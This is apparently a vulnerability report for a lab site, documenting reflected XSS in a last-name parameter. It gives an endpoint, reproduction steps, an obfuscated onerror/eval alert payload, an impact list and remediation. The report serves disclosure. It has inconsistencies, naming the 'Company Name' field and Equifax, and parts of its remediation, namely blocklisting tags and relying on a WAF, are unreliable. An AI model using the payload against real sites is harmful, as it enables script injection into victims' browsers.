
## Title
Refelcted (XSS) in last name parameter

## Vulnerability Type
Reflected XSS

## Summary
The kzlabs.com/punishment page has an XSS vulnerability in its last name feild . whatever you type into the last name feild gets embedded raw into a page response with no sanitization, By injecting an HTML tag with an event handler arbitary JavaScript executes immediately on page load and the popup fires.


## Vulnerable Endpoint
```
http://kzlabs.com/8.php
```

## Steps to Reproduce
1. Go to the following URL
```
 http://kzlabs.com/8.php?1name=
```
2. In the **last name** enter the following XSS payload
```
"><img src=x onerror=eval('ale'+'rt(1)')>
```
3.Wait for the page to load

4.An alert popup appears showing 1


## Payload Used
```
"><img src=x onerror=eval('ale'+'rt(1)')>
```


## Proof of Concept

**Screenshot 1** — Page source showing the payload reflected raw .

<img width="1737" height="863" alt="image" src="https://github.com/user-attachments/assets/ada4b4d6-0846-4bfd-aea1-6deed5a72ad0" />






**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload "><img src=x onerror=eval('ale'+'rt(1)')> ,with the payload visible in the URL bar  confirming reflected XSS execution in the JavaScript context.

<img width="1489" height="886" alt="image" src="https://github.com/user-attachments/assets/b47ea4db-dfbf-4fd1-a60f-5940aa047184" />







## Impact
- Cookie stealing 
- Account takeover by sending crafted link to victim
- JavaScript execution in victim browser
- Can be used to redirect victims to fake login pages that look identical to Equifax to harvest credentials



## Remediation
1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
